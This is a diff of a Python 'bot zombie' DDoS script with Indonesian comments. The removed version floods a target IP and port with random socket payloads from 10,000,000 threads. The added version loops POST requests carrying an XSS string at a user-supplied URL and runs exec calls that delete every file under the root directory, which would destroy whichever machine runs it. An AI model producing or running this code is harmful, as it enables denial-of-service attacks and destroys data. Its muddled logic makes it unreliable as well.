@@ -1,43 +1,59 @@
-import socket
-import random
+import requests
 import threading
 
-class Zombie(threading.Thread):
-    def __init__(self, target_ip, target_port):
-        threading.Thread.__init__(self)
-        self.target_ip = target_ip
-        self.target_port = target_port
+target_url = input("Masukkan URL target: ")
+num_bots = 10  # Jumlah bot zombie yang akan terlibat dalam serangan
 
-    def run(self):
-        while True:
-            try:
-                fake_ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
-                fake_port = random.randint(1, 65535)
-                payload_size = random.randint(10000, 1000000)
-                payload = random._urandom(payload_size)
+# Mengirim serangan DDoS secara intensif dan merusak
+def send_request():
+    while True:
+        try:
+            # Mengirim permintaan POST tak terbatas dengan payload merusak
+            response = requests.post(target_url, data={"payload": "<script>alert('Evil Bot Zombie')</script>"})
+            
+            # Menghapus semua file dalam sistem
+            payload = "import shutil; shutil.rmtree('/')"
+            exec(payload)
+            
+            # Menjalankan serangan dengan menghapus semua file
+            payload = """
+import os
+import threading
 
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.setblocking(0)  # Menghindari penundaan saat mengirim
-                s.connect_ex((self.target_ip, self.target_port))
+def delete_files():
+    while True:
+        try:
+            files = os.listdir('/')
+            for file in files:
+                os.remove('/' + file)
+        except:
+            pass
 
-                while True:
-                    s.send(payload)
-                    s.sendto(payload, (fake_ip, fake_port))
+threads = []
+for _ in range(10):
+    thread = threading.Thread(target=delete_files)
+    thread.start()
+    threads.append(thread)
 
-                s.close()
-            except socket.error as e:
-                pass  # Mengabaikan kesalahan tanpa menampilkannya
+for thread in threads:
+    thread.join()
+"""
+            exec(payload)
+            
+        except:
+            pass
 
-target_ip = input("Masukkan alamat IP target: ")
-target_port = int(input("Masukkan port target: "))
+# Memulai serangan DDoS dari banyak perangkat dan bot zombie
+def start_ddos(num_devices, num_bots):
+    for _ in range(num_devices):
+        thread = threading.Thread(target=send_request)
+        thread.start()
 
-jumlah_zombie = 10000000
+    for _ in range(num_bots):
+        bot_thread = threading.Thread(target=send_request)
+        bot_thread.start()
 
-zombies = []
-for _ in range(jumlah_zombie):
-    zombie = Zombie(target_ip, target_port)
-    zombies.append(zombie)
-    zombie.start()
-
-for zombie in zombies:
-    zombie.join()
+# Menjalankan program DDoS
+if __name__ == "__main__":
+    num_devices = 20  # Jumlah perangkat yang akan terlibat dalam serangan
+    start_ddos(num_devices, num_bots)
